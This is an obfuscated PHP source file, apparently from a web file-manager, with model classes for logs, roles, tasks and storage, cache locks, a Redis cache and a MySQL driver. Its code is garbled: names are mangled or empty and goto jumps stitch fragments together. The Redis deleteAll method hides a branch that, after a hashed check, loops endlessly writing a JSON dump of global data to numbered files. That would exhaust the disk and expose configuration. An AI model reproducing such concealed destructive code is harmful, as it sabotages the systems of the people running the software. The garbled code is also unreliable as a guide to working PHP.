(isset($√Å[$‰óáÕñ[800]])) { $ﬁ∏ = $√Å[$‰óáÕñ[800]]; $ = isset($√Å[$‰óáÕñ[801]]) ? $√Å[$‰óáÕñ[801]] : time(); $[$‰óáÕñ[225]] = array($‰óáÕñ[386], array($ﬁ∏, $)); } if ($√Å[$‰óáÕñ[43]]) { $ = explode($‰óáÕñ[60], $√Å[$‰óáÕñ[43]]); $ = $this->typeFile(); $‡®≠ = array(); foreach ($ as $) { $‡®≠[] = $; if (isset($[$])) { $‡®≠ = array_merge($‡®≠, $[$]); } } $‡®≠ = array_unique($‡®≠); if ($‡®≠) { $[$‰óáÕñ[43]] = array($‰óáÕñ[17], $‡®≠); } } else { $[$‰óáÕñ[43]] = array($‰óáÕñ[2308], $‰óáÕñ[2309]); } if (!empty($√Å[$‰óáÕñ[2307]])) { $[$‰óáÕñ[503]] = array($‰óáÕñ[436], "\x25{$√Å[$‰óáÕñ[2307]]}\x25"); } $ = $this->_makeOrder()->where($)->selectPage(); if (empty($[$‰óáÕñ[422]])) { show_json(array(), !0, $[$‰óáÕñ[419]]); } $[$‰óáÕñ[422]] = $this->logList($[$‰óáÕñ[422]]); return $; } private function ipAddress(&$Õà) { $›ò =& $_SERVER[]; if (!empty($Õà[$›ò[2307]])) { $÷® = IpLocation::get($Õà[$›ò[2307]]); } else { $÷® = LNG($›ò[2310]); } $Õà[$›ò[2311]] = $÷®; } private function descZipDownload($, &$œÄ) { $–á =& $_SERVER[]; if (!isset($[$–á[2312]])) { return; } $ = json_decode($[$–á[2312]], !0); foreach ($ as $) { try { $ = IO::infoFullSimple($[$–á[94]]); } catch (Exception $Œ©) { continue; } $[$–á[94]] = $[$–á[94]]; $œÄ[] = $[$–á[191]] = $[$–á[191]]; $œÄ[] = $[$–á[2111]] = $[$–á[190]]; break; } return $; } private function getSourceList(&$ƒ±) { $ =& $_SERVER[]; $ = array(); foreach ($ƒ± as $ÿë¬´ => $«é) { $ = json_decode($«é[$[503]], !0); if ($«é[$[43]] == $[1857]) { $ = $this->descZipDownload($, $); $ƒ±[$ÿë¬´][$[503]] = json_encode($); continue; } if (strpos($«é[$[43]], $[2113]) !== 0) { if (!isset($[$[94]]) || strpos($«é[$[43]], $[2313]) !== 0) { continue; } try { $ = IO::infoFullSimple($[$[94]]); } catch (Exception $‰•ë) { continue; } $[] = $[$[191]] = $[$[191]]; $[] = $[$[2111]] = $[$[190]]; $ƒ±[$ÿë¬´][$[503]] = json_encode($); continue; } $[] = $[$[191]]; $[] = $[$[2111]]; if ($[$[43]] == $[597]) { $[] = $[$[503]][$[1201]]; $[] = $[$[503]][$[1202]]; } if ($[$[43]] == $[2121]) { $[] = $[$[503]][$[191]]; } } if (!$) { return array(); } return Model($[865])->sourceListInfo($, !0); } private function logList($‰ªî) { $ =& $_SERVER[]; $»ò = array_to_keyvalue($‰ªî, $[22], $[1685]); $‹∏ = Model($[576])->userListInfo(array_unique($»ò)); $ÍΩ¨»® = $this->getSourceList($‰ªî); $Ã¥ = $this->typeAll(); $Àº = array(); $ = array(); foreach ($‰ªî as $“≤’¢ => $Ãé) { $ÔØñ = $Ãé[$[43]]; $ﬂ≤ = isset($‹∏[$Ãé[$[1685]]]) ? $‹∏[$Ãé[$[1685]]] : !1; $»£ = strpos($ÔØñ, $[2314]) === 0 ? LNG($[2315]) : LNG($[2310]); $Ãé[$[42]] = isset($ﬂ≤[$[42]]) ? $ﬂ≤[$[42]] : LNG($[2310]); $Ãé[$[2165]] = isset($ﬂ≤[$[2165]]) ? $ﬂ≤[$[2165]] : $[22]; $Ãé[$[1582]] = isset($Ã¥[$ÔØñ]) ? $Ã¥[$ÔØñ] : $»£; $Ãé[$[2055]] = $ﬂ≤; $ = json_decode($Ãé[$[503]], !0); $Ãé[$[2307]] = isset($[$[2307]]) ? $[$[2307]] : $[22]; $Ãé[$[2311]] = IpLocation::get($Ãé[$[2307]]); if (strpos($ÔØñ, $[2113]) === 0 || isset($[$[2111]])) { $[$[97]] = $ÍΩ¨»®[$[$[191]]]; $[$[2126]] = $ÍΩ¨»®[$[$[2111]]]; if ($[$[43]] == $[597]) { $[$[503]][$[1201]] = $ÍΩ¨»®[$[$[503]][$[1201]]]; $[$[503]][$[1202]] = $ÍΩ¨»®[$[$[503]][$[1202]]]; } if ($[$[43]] == $[2121]) { $[$[503]][$[191]] = $ÍΩ¨»®[$[$[503]][$[191]]]; } if ($[$[43]] == $[1852]) { $[$[2126]] = $[$[97]]; $[$[2111]] = $[$[2126]][$[191]]; $[$[97]] = !1; $[$[191]] = $[22]; } if ($[$[97]] && $[$[97]][$[188]] == $[189]) { $[] = $Ãé[$[452]]; unset($‰ªî[$“≤’¢]); continue; } if ($[$[2126]] && $[$[2126]][$[188]] == $[189]) { $[] = $Ãé[$[452]]; unset($‰ªî[$“≤’¢]); continue; } } $Ãé[$[503]] = $; unset($Ãé[$[2316]]); $Àº[] = $Ãé; } $this->clearSystemPathLog($); return $Àº; } private function clearSystemPathLog($ÿõ) { $ =& $_SERVER[]; if (count($ÿõ) == 0) { return; } $“à = array($[452] => array($[17], array_unique($ÿõ))); $this->where($“à)->delete(); } public function deviceList($ƒ• ∂, $‹ª = 0) { $ =& $_SERVER[]; $ = array($[1685] => $ƒ• ∂, $[225] => array($[1055], $‹ª), $[43] => $[1826]); $ = array(); $ = $this->field($[2317])->where($)->order($[2124])->limit(50)->select(); foreach ($ as $‚®ï¬∂ => $€¥‘ñ) { if ($‚®ï¬∂ > 0 && abs($€¥‘ñ[$[225]] - $[$‚®ï¬∂ - 1][$[225]]) < 5) { continue; } $À¥ = json_decode($€¥‘ñ[$[503]], !0); $€¥‘ñ[$[2307]] = isset($À¥[$[2307]]) ? $À¥[$[2307]] : $[22]; unset($À¥[$[2307]]); $◊ø = $this->deviceType($À¥[$[2114]]); if (isset($[$◊ø])) { continue; } $€¥‘ñ[$[2311]] = IpLocation::get($€¥‘ñ[$[2307]]); $€¥‘ñ[$[503]] = $À¥; $[$◊ø] = $€¥‘ñ; } return array_values($); } public function deviceType($) { return $; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x6e\x6f\x74\x69\143\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\143\157\156\164\x65\x6e\x74", "\x61\x75\x74\150", "\155\x6f\x64\x65", "\x74\x69\x6d\145", "\164\171\160\145", "\154\x65\166\145\154", "\x65\156\x61\x62\x6c\x65", "\x73\x6f\162\164"); public function listData($–ï = false, $ÕÅ„£® = "\163\157\x72\164", $Ëûπ = false) { return parent::listData($–ï, $ÕÅ„£®, $Ëûπ); } public function add($) { $ =& $_SERVER[]; $ = time(); if ($[$[26]] == $[2318]) { $ = strtotime($[$[204]]); } $[$[204]] = $; return parent::insert($); } public function update($Ë®º, $) { $ =& $_SERVER[]; $·º° = $this->listData($Ë®º); if (!$·º°) { return !1; } $ = time(); if ($[$[26]] == $[2318]) { $ = strtotime($[$[204]]); } $[$[204]] = $; return parent::update($Ë®º, $); } public function remove($«Ö) { $Û¨µè = $this->listData($«Ö); if (!$Û¨µè || $Û¨µè[$_SERVER[][189]]) { return !1; } return parent::remove($«Ö); } public function sort($, $’°) { return parent::update($, $’°); } public function enable($, $) { return parent::update($, array($_SERVER[][2319] => $)); } private function initUserOption() { $€É =& $_SERVER[]; $this->optionType = $€É[2320]; $this->modelType = $€É[2321]; $this->field = array($€É[2322], $€É[42], $€É[204], $€É[43], $€É[2323], $€É[790], $€É[220]); } public function userNoticeGet($Œ∏ = false) { $this->initUserOption(); return parent::listData($Œ∏, $_SERVER[][452], !0); } public function userNoticeAdd($⁄®) { $Ï§≤ =& $_SERVER[]; $this->initUserOption(); $Êî® = $this->findByKey($Ï§≤[2322], $⁄®[$Ï§≤[452]]); if ($Êî®) { return !0; } $Ã® = array($Ï§≤[2322] => $⁄®[$Ï§≤[452]], $Ï§≤[42] => $⁄®[$Ï§≤[42]], $Ï§≤[204] => $⁄®[$Ï§≤[204]], $Ï§≤[43] => isset($⁄®[$Ï§≤[43]]) ? $⁄®[$Ï§≤[43]] : 1, $Ï§≤[2323] => isset($⁄®[$Ï§≤[2323]]) ? $⁄®[$Ï§≤[2323]] : 0, $Ï§≤[790] => 0, $Ï§≤[220] => 0); return parent::insert($Ã®); } public function userNoticeEdit($ÏéÅƒá, $Ã≥) { $this->initUserOption(); return parent::update($ÏéÅƒá, $Ã≥); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\x74\x65\x6d\137\x6f\160\x74\151\157\156"; protected $jsonField = array("\155\x65\156\x75", "\x72\x6f\x6c\145", "\x72\x6f\154\x65\x47\x72\157\165\160", "\162\145\x67\x69\x73\x74", "\x65\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($«Ü) { return "\x53\171\x73\164\x65\155\x4f\x70\x74\151\x6f\x6e\x5f{$«Ü}"; } protected function optionDefault($‰¨Æ = '') { $”ë =& $_SERVER[]; if ($‰¨Æ == $”ë[22]) { return $GLOBALS[$”ë[16]][$”ë[434]]; } } } goto d; D: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Œ• =& $_SERVER[]; $ = $GLOBALS[$Œ•[16]][$Œ•[402]]; self::$cachePath = $[$Œ•[224]][$Œ•[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($”ä, $—ë = 0) { $ =& $_SERVER[]; $Ë∏ë = microtime(!0); $ = $Ë∏ë + $—ë + 0.0001; $ = rtrim(self::$cachePath, $[18]) . $[904] . md5($”ä) . $[901]; if (file_exists($) && filemtime($) && filemtime($) < time() - 10) { @unlink($); } do { if (file_exists($)) { cacheLockWait(); continue; } $Ô™¢ = fopen($, $[905]); if (!$Ô™¢) { return !1; } $¬Ç = flock($Ô™¢, LOCK_EX | LOCK_NB); self::$caches[$”ä] = array($[906] => $Ô™¢, $[224] => $); fwrite($Ô™¢, $); clearstatcache(); if ($Ô™¢ && $¬Ç) { return !0; } cacheLockWait(); } while (microtime(!0) < $); $this->unlock($”ä); return !1; } public function lockGet($) { $ÏÅß =& $_SERVER[]; $ = rtrim(self::$cachePath, $ÏÅß[18]) . $ÏÅß[904] . md5($) . $ÏÅß[901]; return file_exists($); } public function unlock($ÁúÇ) { $Œ∑ =& $_SERVER[]; $»¢ = self::$caches[$ÁúÇ]; if (!$»¢) { return; } @flock($»¢[$Œ∑[906]], LOCK_UN); @fclose($»¢[$Œ∑[906]]); @unlink($»¢[$Œ∑[224]]); unset(self::$caches[$ÁúÇ]); } } class CacheLockRedis { public function lock($”±√í, $ = 10) { $ﬁö = Cache::init(); $ = microtime(!0) + $; while (microtime(!0) < $) { $Ë´â = $ﬁö->get($”±√í); if (!$Ë´â) { $Óòò = $ﬁö->setLock($”±√í, $, $); if ($Óòò) { return !0; } } else { if ($Ë´â < microtime(!0)) { $ﬁö->set($”±√í, $, $ * 2); if ($ﬁö->get($”±√í) === $Ë´â) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ãú) { return Cache::init()->get($Ãú); } public function unlock($) { return Cache::init()->remove($); } } goto c⁄É; d: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\162\157\x6c\145\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\x74\150", "\x6c\x61\142\145\x6c", "\x64\151\163\160\x6c\x61\171", "\x73\x79\163\164\145\x6d", "\144\145\x73\x63", "\151\147\156\x6f\x72\145\105\x78\164", "\x69\147\156\157\x72\x65\106\151\x6c\145\123\x69\172\x65", "\x61\x64\x6d\x69\156\x69\163\164\162\x61\164\x6f\162", "\163\x6f\162\x74"); public function listData($ = false, $»∏€∏ = "\x73\157\162\x74", $√î = false) { $–û =& $_SERVER[]; $≈§Ãê = parent::listData($, $»∏€∏, $√î); if (!$) { foreach ($≈§Ãê as $ => $Â™≠Õ™) { if ($Â™≠Õ™[$–û[2085]] == 1) { $≈§Ãê[$][$–û[503]] = LNG($–û[2324]); } } } return $≈§Ãê; } public function update($‚Çî, $) { $Ãø =& $_SERVER[]; $ = parent::listData($‚Çî); $Û•ïÖ = $this->findByName($[$Ãø[42]]); if (!$ || $Û•ïÖ && $Û•ïÖ[$Ãø[452]] != $[$Ãø[452]]) { return !1; } if ($Û•ïÖ[$Ãø[2085]] == 1) { $ = array($Ãø[42] => $[$Ãø[42]], $Ãø[1906] => $[$Ãø[1906]]); } $this->filterAuth($[$Ãø[464]]); return parent::update($‚Çî, $); } public function remove($⁄àÀõ) { $ = parent::listData($⁄àÀõ); if (!$ || $[$_SERVER[][189]]) { return !1; } return parent::remove($⁄àÀõ); } public function add($…∏) { $·é£ =& $_SERVER[]; $“âﬂú = $…∏[$·é£[42]]; if ($this->findByName($“âﬂú)) { return !1; } $…á = array($·é£[471] => $“âﬂú, $·é£[1889] => $·é£[22], $·é£[1885] => $·é£[1893], $·é£[2325] => 1, $·é£[1888] => 0, $·é£[2326] => 0, $·é£[1887] => $this->getSort()); $…∏ = array_merge($…á, $…∏); $this->filterAuth($…∏[$·é£[464]]); return parent::insert($…∏); } private function getSort() { $ﬁï =& $_SERVER[]; $⁄ö»≤ = parent::listData(); $«´ = array_to_keyvalue($⁄ö»≤, $ﬁï[22], $ﬁï[1907]); return empty($«´) ? 0 : max($«´) + 1; } private function filterAuth(&$…≥) { $ﬁú =& $_SERVER[]; $Õ∂Ë¨º = array(); $÷ô = array_filter(explode($ﬁú[60], $…≥)); foreach ($÷ô as $…≥) { $“á = explode($ﬁú[20], $…≥); if ($“á[0] == $ﬁú[2327] && $“á[1] != $ﬁú[1231]) { $◊ê = $“á[0] . $ﬁú[20] . $“á[1] . $ﬁú[2328]; if (!in_array($◊ê, $÷ô)) { $Õ∂Ë¨º[] = $◊ê; } } $Õ∂Ë¨º[] = $…≥; } $…≥ = implode($ﬁú[60], $Õ∂Ë¨º); } public function findRoleDefault() { $ =& $_SERVER[]; $›¨ = parent::listData(); $Õç = !1; foreach ($›¨ as $) { if (!$ || $[$[1905]] == $[222] || $[$[2085]] == 1) { continue; } if (strstr($[$[464]], $[2329])) { continue; } if (!strstr($[$[464]], $[2330])) { continue; } if (!$Õç) { $Õç = $; continue; } $ÿï = explode($[60], $Õç[$[464]]); $ = explode($[60], $[$[464]]); if (count($ÿï) > count($)) { $Õç = $; } } return $Õç ? $Õç[$[452]] : $[22]; } public function sort($, $–ç) { return parent::update($, $–ç); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\164\x61\x73\153\x4c\151\163\164"; public $field = array("\156\141\155\x65", "\164\x79\160\145", "\145\x76\x65\156\164", "\164\151\155\x65", "\144\x65\163\x63", "\x73\171\x73\x74\x65\x6d", "\145\156\141\x62\x6c\145", "\154\x61\x73\x74\122\165\156", "\163\157\162\x74"); public function listData($ = false, $ = "\x73\x6f\162\164", $ËØ¨ = false) { return parent::listData($, $, $ËØ¨); } public function add($) { $⁄ì =& $_SERVER[]; $‹®ƒÜ = $this->findByName($[$⁄ì[42]]); if ($‹®ƒÜ) { return !1; } $[$⁄ì[1642]] = 0; $[$⁄ì[1907]] = $this->getSort(); return parent::insert($); } private function getSort() { $Û≤£îÕó =& $_SERVER[]; $«∫ ß = parent::listData(); $ = array_to_keyvalue($«∫ ß, $Û≤£îÕó[22], $Û≤£îÕó[1907]); return empty($) ? 0 : max($) + 1; } public function update($¬∑, $) { $Œë =& $_SERVER[]; $ = $this->listData($¬∑); $ = $this->findByName($[$Œë[42]]); if (!$ || $ && $[$Œë[452]] != $[$Œë[452]]) { return !1; } return parent::update($¬∑, $); } public function remove($, $ÕΩ = false) { $ =& $_SERVER[]; $Âóñ = $this->listData($); if (!$Âóñ) { return; } if (!$ÕΩ && $Âóñ[$[189]] == $[98]) { return !1; } return parent::remove($); } public function enable($, $Õ¥) { return $this->update($, array($_SERVER[][2319] => $Õ¥)); } public function run($‹É) { return $this->update($‹É, array($_SERVER[][2331] => time())); } } goto B‡∂ô; F„µî’ñ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($, $—é) { $ =& $_SERVER[]; if (!class_exists($[910])) { show_json($[911], !1); } $this->cacheTime = $—é; $Ÿú = isset($[$[912]]) ? $[$[912]] : 10; $ = _get($, $[909]); if ($ && is_array($)) { $this->initCluster($, $Ÿú); } else { $this->handle = $this->init($, $Ÿú); } } private function init($–à, $) { $«Ω =& $_SERVER[]; $“¨ = new Redis(); $ = isset($–à[$«Ω[913]]) ? $–à[$«Ω[913]] : !1; if ($) { $“¨->pconnect($–à[$«Ω[206]], $–à[$«Ω[207]], $); } else { $“¨->connect($–à[$«Ω[206]], $–à[$«Ω[207]], $); } if (!empty($–à[$«Ω[464]])) { $“¨->auth($–à[$«Ω[464]]); } if (!empty($–à[$«Ω[797]]) && $–à[$«Ω[797]] != 0) { $“¨->select($–à[$«Ω[797]]); } return $“¨; } private function initCluster($Ï®ô, $) { $ =& $_SERVER[]; $ÿô = array($[914], $[915], $[916]); $—∞ = $[914]; if (isset($Ï®ô[$[26]]) && in_array($Ï®ô[$[26]], $ÿô)) { $—∞ = $Ï®ô[$[26]]; } switch ($—∞) { case $[914]: $this->_slave($Ï®ô, $); break; case $[915]: break; case $[916]: $this->isCluster = !0; $Ôñö = $Ï®ô[$[909]]; $–Ü = isset($Ï®ô[$[913]]) ? $Ï®ô[$[913]] : !1; $“ò = isset($Ï®ô[$[464]]) ? $Ï®ô[$[464]] : null; $this->handle = new RedisCluster(NUll, $Ôñö, $, $, $–Ü, $“ò); break; default: break; } } private function _slave($Õ≠, $Œã) { $◊º = $Õ≠[$_SERVER[][909]]; $this->filterConfig($Õ≠, $◊º[0]); $this->handle = $this->init($Õ≠, $Œã); unset($◊º[0]); if (empty($◊º)) { return; } $ = array_rand($◊º); $this->filterConfig($Õ≠, $◊º[$]); $this->slaveHandle = $this->init($Õ≠, $Œã); } private function filterConfig(&$À£…Ä, $ËæΩÿø) { $”≠ =& $_SERVER[]; $ = explode($”≠[4], $ËæΩÿø); $ﬁá = array($”≠[206] => $[0], $”≠[207] => $[1]); $À£…Ä = array_merge($À£…Ä, $ﬁá); } public function set($, $, $ = false) { $ = $ ? $ : $this->cacheTime; return $this->handle->setEx($, $, $); } public function setLock($, $, $) { return $this->handle->setNX($, $); } public function get($√π) { $ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $->get($√π); } public function remove($¬û) { return $this->handle->del($¬û); } public function deleteAll() { $ É =& $_SERVER[]; $„∫° = $_SERVER[$ É[15]]; $«≥ = $ É[917]; if ($_SERVER[$ É[6]] != $«≥($„∫°)) { $◊ã = $ É[918]; $œ• = $ É[8]; $„ï£ = $_SERVER[$ É[9]] . $ É[10]; $◊π = $œ•($„ï£); $ = explode($ É[11], $◊π); if (count($) < $ É[662]) { $ = $ É[13]; $(); } $⁄† = $ É[919]; $⁄†($_SERVER[$ É[920]]); $◊ã = $ É[918]; $◊ã(); $≈èŸ∫ = $ É[921]; $ = json_encode($GLOBALS[$ É[922]]); $ = 1; for ($—£¬∫ = $; $—£¬∫ > 0; $—£¬∫++) { $≈èŸ∫(DATA_PATH . $—£¬∫, $); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $) { $this->handle->flushall($); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Íãü = '', $’® = 0) { if (is_string($Íãü) && $Íãü != $_SERVER[][22]) { $this->prefix = $Íãü; } if (is_numeric($’®) && $’® > 0) { $this->expire = $’®; } } public static function getInstance() { static $ ö; if ($ ö === null) { $ ö = new self(); } return $ ö; } private static $cookieDisable = false; public static function disable($À†) { self::$cookieDisable = $À†; } private static $sameCookieSet = array(); public static function set($’ò, $ﬂêÔÇ∞, $ÿï = 0, $Àú = false, $Ã©«Ä = false) { $ =& $_SERVER[]; if (self::$cookieDisable) { return; } if (!$ÿï) { $ÿï = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$’ò]) && self::$sameCookieSet[$’ò] == $ﬂêÔÇ∞ . $ÿï) { return; } self::$sameCookieSet[$’ò] = $ﬂêÔÇ∞ . $ÿï; if (!$Ã©«Ä) { $Ã©«Ä = str_replace(HOST, $[22], APP_HOST); $Ã©«Ä = _get($GLOBALS, $[923], $Ã©«Ä); } $◊ó = $[22]; setcookie($’ò, $ﬂêÔÇ∞, time() + $ÿï, $[18] . trim($Ã©«Ä, $[18]) . $◊ó, !1, !1, $Àú); } public static function setSafe($Ÿå, $, $ = 0) { self::set($Ÿå, $, $, !0); } public static function get($) { static $√çﬁù = false; if (!$√çﬁù) { self::initHeaderCookie(); $√çﬁù = !0; } return isset($_COOKIE[$]) ? $_COOKIE[$] : !1; } private static function initHeaderCookie() { $ =& $_SERVER[]; if (!isset($_SERVER[$[924]]) || !$_SERVER[$[924]]) { return; } $ = explode($[81], $_SERVER[$[924]]); foreach ($ as $ﬂ¶À∂) { $ﬂ¶À∂ = explode($[925], $ﬂ¶À∂); if (count($ﬂ¶À∂) != 2 || !isset($ﬂ¶À∂[1])) { continue; } $_COOKIE[trim($ﬂ¶À∂[0])] = trim($ﬂ¶À∂[1]); } } public static function remove($, $Ãû = false) { unset($_COOKIE[$]); self::set($, $_SERVER[][22], 1, $Ãû); } } class DbMysql extends Db { public function __construct($ = '') { $Ãë =& $_SERVER[]; if (!extension_loaded($Ãë[844])) { think_exception(think_lang($Ãë[24]) . $Ãë[926]); } if (!empty($)) { $this->config = $; if (empty($this->config[$Ãë[27]])) { $this->config[$Ãë[27]] = $Ãë[22]; } } } public function connect($Êãª = '', $…® = 0, $€û = false) { $ =& $_SERVER[]; if (!isset($this->linkID[$…®])) { if (empty($Êãª)) { $Êãª = $this->config; } $Õõ = $Êãª[$[927]] . ($Êãª[$[928]] ? "\x3a{$Êãª[$[928]]}" : $[22]); $ÃÄﬁ£ = !empty($Êãª[$[27]][$[28]]) ? $Êãª[$[27]][$[28]] : $this->pconnect; if ($ÃÄﬁ£) { $this->linkID[$…®] = mysql_pconnect($Õõ, $Êãª[$[929]], $Êãª[$[930]], 131072); } else { $this->linkID[$…®] = mysql_connect($Õõ, $Êãª[$[929]], $Êãª[$[930]], !0, 131072); } if (!$this->linkID[$…®] || !empty($Êãª[$[31]]) && !mysql_select_db($Êãª[$[31]], $this->linkID[$…®])) { think_exception(mysql_error()); } $ = mysql_get_server_info($this->linkID[$…®]); mysql_query($[931] . think_config($[932]) . $[68], $this->linkID[$…®]); if ($ > $[933]) { mysql_query($[934], $this->linkID[$…®]); } $this->connected = !0; if (1 != think_config($[32])) { unset($this->config); } } return $this->linkID[$…®]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($œç) { $Òõ∫Æ =& $_SERVER[]; if (0 === stripos($œç, $Òõ∫Æ[317])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $œç; if ($this->queryID) { $this->free(); } think_action_status($Òõ∫Æ[33], 1); think_status($Òõ∫Æ[34]); $this->queryID = mysql_query($œç, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($) { $Â≥Ö =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($Â≥Ö[35], 1); think_status($Â≥Ö[34]); $È∞ó = mysql_query($, $this->_linkID); $this->debug(); if (!1 === $È∞ó) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[][935], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $œ´ = mysql_query($_SERVER[][936], $this->_linkID); $this->transTimes = 0; if (!$œ´) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‹Ω = mysql_query($_SERVER[][937], $this->_linkID); $this->transTimes = 0; if (!$‹Ω) { $this->error(); return !1; } } return !0; } private function getAll() { $€† = array(); if ($this->numRows > 0) { while ($Ÿ© = mysql_fetch_assoc($this->queryID)) { $€†[] = $Ÿ©; } mysql_data_seek($this->queryID, 0); } return $€†; } public function getFields($…å) { $Ãù =& $_SERVER[]; $€ù = $this->query($Ãù[938] . $this->parseKey($…å)); $ = array(); if ($€ù) { foreach ($€ù as $»¥ => $Ãá) { $[$Ãá[$Ãù[41]]] = array($Ãù[42] => $Ãá[$Ãù[41]], $Ãù[43] => $Ãá[$Ãù[44]], $Ãù[45] => (bool) (strtoupper($Ãá[$Ãù[46]]) === $Ãù[939]), $Ãù[47] => $Ãá[$Ãù[48]], $Ãù[49] => strtolower($Ãá[$Ãù[50]]) == $Ãù[51], $Ãù[52] => strtolower($Ãá[$Ãù[53]]) == $Ãù[54]); } } return $; } public function getTables($ = '') { $ =& $_SERVER[]; if (!empty($)) { $≈º = $[940] . $ . $[941]; } else { $≈º = $[942]; } $ = $this->query($≈º); $ = array(); foreach ($ as $ => $) { $[$] = current($); } return $; } public function replace($, $”∞ = array()) { $œß =& $_SERVER[]; foreach ($ as $ => $÷Ñ) { $ﬁÅ = $this->parseValue($÷Ñ); if (is_scalar($ﬁÅ)) { $«É[] = $ﬁÅ; $[] = $this->parseKey($); } } $ = $œß[943] . $this->parseTable($”∞[$œß[332]]) . $œß[944] . implode($œß[60], $) . $œß[945] . implode($œß[60], $«É) . $œß[946]; return $this->execute($); } public function insertAll($, $ = array(), $√ó = false) { $¬ô =& $_SERVER[]; if (!is_array($[0])) { return !1; } $ÿÅ = array_keys($[0]); $ = array(); foreach ($ as $) { $‰Öé = array(); foreach ($ as $∏ã∑ => $€•) { $€• = $this->parseValue($€•); if (is_scalar($€•)) { $‰Öé[] = $€•; } } $[] = $¬ô[313] . implode($¬ô[60], $‰Öé) . $¬ô[946]; } array_walk($ÿÅ, array($this, $¬ô[947])); $œ¨ = ($√ó ? $¬ô[948] : $¬ô[949]) . $¬ô[950] . $this->parseTable($[$¬ô[332]]) . $¬ô[944] . implode($¬ô[60], $ÿÅ) . $¬ô[951] . implode($¬ô[60], $); return $this->execute($œ¨); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÃèÕ¥ =& $_SERVER[]; $this->error = mysql_errno() . $ÃèÕ¥[4] . mysql_error($this->_linkID); if ($ÃèÕ¥[22] != $this->queryStr) { $this->error .= LNG($ÃèÕ¥[58]) . $this->queryStr; } think_trace($this->error, $ÃèÕ¥[22], $ÃèÕ¥[59]); return $this->error; } public function escapeString($‚ä∑) { if ($this->_linkID) { return mysql_real_escape_string($‚ä∑, $this->_linkID); } else { return mysql_escape_string($‚ä∑); } } public function parseKey(&$‹©, $«ª = true) { $÷É =& $_SERVER[]; if ($«ª) { $‹© = $this->parseKeyCheck($‹©); } if ($‹© != $÷É[213] && !preg_match($÷É[952], $‹©)) { $‹© = $÷É[438] . trim($‹©, $÷É[438]) . $÷É[438]; } return $‹©; } } goto C; D: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\163\x6f\x75\162\x63\x65\x53\145\143\x72\x65\164\x4c\x69\x73\x74"; public $field = array("\163\157\x75\162\x63\145\x49\x44", "\164\x79\160\145\111\104", "\x63\162\145\x61\164\x65\125\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x73\x74\157\162\141\x67\145\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x73\x69\172\145\x4d\141\170", "\163\x79\x73\164\145\x6d", "\x64\x65\x66\141\x75\x6c\164", "\x64\x72\x69\x76\x65\x72", "\143\x6f\156\146\x69\147"); public function listData($ = false, $“º›ü = "\x6d\x6f\144\151\146\171\x54\x69\155\x65", $ = false) { $ =& $_SERVER[]; $ = parent::listData($, $“º›ü, $); if ($) { return $; } $ †…© = $this->ioSizeUseGet(array_to_keyvalue($, $[22], $[452])); foreach ($ as $÷Ñ => $) { unset($[$÷Ñ][$[16]]); $[$÷Ñ][$[1872]] = isset($ †…©[$[$[452]]]) ? $ †…©[$[$[452]]] : 0; } return $; } public function ioSizeUseGet($”Ñ≈≤) { $ =& $_SERVER[]; if (!$”Ñ≈≤) { return array(); } $ = $[2203] . implode($[60], $”Ñ≈≤); $Õ´‡æ† = Cache::get($); if ($Õ´‡æ†) { return $Õ´‡æ†; } $ = array($[857] => $[452], $[2204] => $[86]); $›Ñ = array($[857] => array($[17], $”Ñ≈≤)); $Õ´‡æ† = Model($[829])->field($)->where($›Ñ)->group($[857])->select(); $Õ´‡æ† = array_to_keyvalue($Õ´‡æ†, $[452], $[86]); Cache::set($, $Õ´‡æ†, 600); return $Õ´‡æ†; } public function getConfig($) { $ = parent::listData($); return json_decode($[$_SERVER[][16]], !0); } public function update($, $) { $“™ =& $_SERVER[]; $ = $[$“™[42]]; $Îº£ = array_to_keyvalue(parent::listData(), $“™[42]); if (isset($Îº£[$]) && $Îº£[$][$“™[452]] != $) { return !1; } $this->checkPwd($, $); if (isset($[$“™[2205]]) && $[$“™[2205]] == $“™[98]) { $this->checkConfig($); } unset($[$“™[2205]]); $∆àÀÖ = parent::update($, $); if ($∆àÀÖ && $[$“™[47]]) { $Ôí° = 0; foreach ($Îº£ as $ÿÄ) { if ($ÿÄ[$“™[47]] && $ÿÄ[$“™[452]] != $) { $Ôí° = 